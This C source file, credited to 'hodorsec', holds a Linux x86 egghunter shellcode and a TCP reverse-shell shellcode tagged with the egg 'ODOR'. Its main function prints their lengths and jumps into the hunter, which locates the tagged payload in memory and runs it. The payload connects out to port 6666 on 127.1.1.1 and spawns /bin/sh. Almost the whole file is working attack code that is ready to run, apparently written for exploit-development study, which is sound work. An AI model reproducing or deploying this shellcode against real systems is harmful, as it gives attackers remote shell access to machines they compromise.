/*
Author: hodorsec
Filename: egghunt_rev_tcp_initial-c.c
*/

#include<stdio.h>
#include<string.h>

// Define a 4 byte string value to search for as egghunt string
#define HUNT "\x4f\x44\x4f\x52"     // 'ODOR'

// Setup egghunting shellcode with HUNT as the variable for the string to search for
unsigned char hunter[] = \
"\x31\xc9\xeb\x1e\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
HUNT
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7\xe8\xe2\xff\xff\xff";

// TCP reverse shell on 6666 on host 127.1.1.1
// Use the egghunt string twice, because of the SCASD function being called twice for the first and second half of loading the string
unsigned char code[] = \
HUNT HUNT
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x92\x43\x68\x7f\x01\x01\x01\x66\x68\xe5\xf5\x66\x5f\x66\x83\xf7\xff\x66\x57\x66\x53\x89\xe1\x43\xb0\x66\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x87\xd6\xcd\x80";

main()
{
	
	printf("Egghunter Length:  %d\n", strlen(hunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())hunter;

	ret();

}
